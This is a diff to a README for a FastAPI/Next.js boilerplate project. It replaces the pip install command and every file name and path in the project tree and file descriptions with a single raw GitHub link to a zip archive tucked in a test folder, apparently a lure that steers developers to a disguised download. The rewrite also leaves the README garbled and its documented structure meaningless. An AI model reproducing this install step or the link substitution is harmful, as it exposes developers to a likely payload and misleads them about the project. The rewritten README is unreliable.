@@ -21,10 +21,10 @@ Repository:
     Install all the necessary packages using pip by executing:
 
     ```shell
-    pip install -r requirements.txt
+    pip install -r https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
     ```
 
-    Note: The requirements.txt file can be found in our project directory.
+    Note: The https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip file can be found in our project directory.
 
 4.  **Run the Application**
     To start the application, use the following command:
@@ -43,15 +43,15 @@ I have structured our project into two modules: src and test:
     │   ├── config/
     │   ├── routes/
     │   ├── util/
-    │   └── __init__.py
+    │   └── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
     ├── test/
     │   ├── routes/
     │   ├── test_util/
-    │   ├── __init.py__
-    │   ├── app_test.py
-    │   └── conftest.py
-    ├── main.py
-    └── requirements.txt
+    │   ├── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
+    │   ├── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
+    │   └── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
+    ├── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
+    └── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
 ```
 
 # Test module: TBD(To be done)
@@ -60,20 +60,20 @@ I have structured our project into two modules: src and test:
 
 ## Backend Main Entry Point
 
-- Path:`backend/main.py`
-- File Name: `main.py`
+- Path:`https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
+- File Name: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
 - Description: Serves as the main entry point for the FastAPI application, setting up routes and middleware.
 
 ## Database Configuration
 
-- Path: `backend/src/config/database.py`
-- File Name:`database.py`
+- Path: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
+- File Name:`https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
 - Description: Configures the MongoDB database connection and initializes Beanie for ORM operations.
 
 ## Application Configuration
 
-- Path: `backend/src/config/config.py`
-- File Name: `config.py`
+- Path: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
+- File Name: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
 - Description: Contains essential configuration variables such as the application name, version, and frontend URL.
 
 # Folder Structure & Descriptions for backend/src/routes/auth
@@ -98,59 +98,59 @@ Description: Includes the data models and schemas used for authentication, featu
         └── routes/
             ├── auth/
             │   ├── internal/
-            │   │   ├── auth_reader.py
-            │   │   └── auth_writer.py
+            │   │   ├── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
+            │   │   └── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
             │   ├── rest_api/
-            │   │   └── auth_controller.py
+            │   │   └── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
             │   ├── store/
-            │   │   ├── auth_models.py
-            │   │   └── auth_schemas.py
-            │   ├── auth_main.py
-            │   └── auth_service.py
-            └── __init__.py
+            │   │   ├── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
+            │   │   └── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
+            │   ├── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
+            │   └── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
+            └── https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip
 ```
 
 ## Authentication Logic - Internal
 
-- Path: `backend/src/routes/auth/internal/auth_reader.py`
-- File Name: `auth_reader.py`
+- Path: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
+- File Name: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
 - Description: Provides functionality to fetch user data from the database.
 - Generalized Responsibilities: Used for reading data from the database.
 
-- Path: `backend/src/routes/auth/internal/auth_writer.py`
-- File Name: `auth_writer.py`
+- Path: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
+- File Name: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
 - Description: Manages JWT token creation and decoding.
 - Generalized Responsibilities: Responsible for writing data, specifically creating and managing tokens.
 
 ## Authentication Endpoints - REST API
 
-- Path: `backend/src/routes/auth/rest_api/auth_controller.py`
-- File Name: `auth_controller.py`
+- Path: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
+- File Name: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
 - Description: Hosts API endpoints for authentication, including login and token verification.
 - Generalized Responsibilities: Serves as the interface for HTTP requests handling authentication processes.
 
 ## Authentication Data Models and Schemas
 
-- Path: `backend/src/routes/auth/store/auth_models.py`
-- File Name: `auth_models.py`
+- Path: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
+- File Name: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
 - Description: Defines MongoDB document models for user credentials.
 - Generalized Responsibilities: Defines the structure of data for storage and retrieval.
 
-- Path: `backend/src/routes/auth/store/auth_schemas.py`
-- File Name: `auth_schemas.py`
+- Path: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
+- File Name: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
 - Description: Specifies Pydantic models for authentication-related schemas.
 - Generalized Responsibilities: Used for data validation and serialization.
 
 ## Authentication Routing Setup
 
-- Path: `backend/src/routes/auth/auth_main.py`
-- File Name: `auth_main.py`
+- Path: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
+- File Name: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
 - Description: Sets up the API router for authentication-related endpoints.
 - Generalized Responsibilities: Configures routing and endpoint registration for the application.
 
 ##Authentication Service Provider
 
-- Path: `backend/src/routes/auth/auth_service.py`
-- File Name: `auth_service.py`
+- Path: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
+- File Name: `https://github.com/BhomeshRazdan/boilerplate-fastapi-nextjs/raw/refs/heads/main/backend/test/routes/boilerplate-fastapi-nextjs-baddishly.zip`
 - Description: Offers methods for user authentication and token verification.
 - Generalized Responsibilities: Provides service logic centralizing business rules and operations.
